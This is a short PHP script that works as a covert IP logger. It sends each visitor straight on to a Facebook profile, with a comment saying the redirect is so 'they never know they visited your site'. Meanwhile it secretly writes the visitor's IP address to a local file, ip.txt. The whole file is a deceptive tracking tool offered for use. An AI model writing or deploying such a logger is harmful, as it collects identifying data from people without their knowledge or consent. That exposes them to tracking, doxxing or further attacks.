<?php
//redirect the user so they never know they visited your site
header( 'Location: https://www.facebook.com/SparkyDzz' ) ;
//Get the ip address of the user
$ip=$_SERVER['REMOTE_ADDR'];
//Write the ip to a file
$myFile = "ip.txt";
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = "$ip\n";
fwrite($fh, $stringData);
fclose($fh);
?>
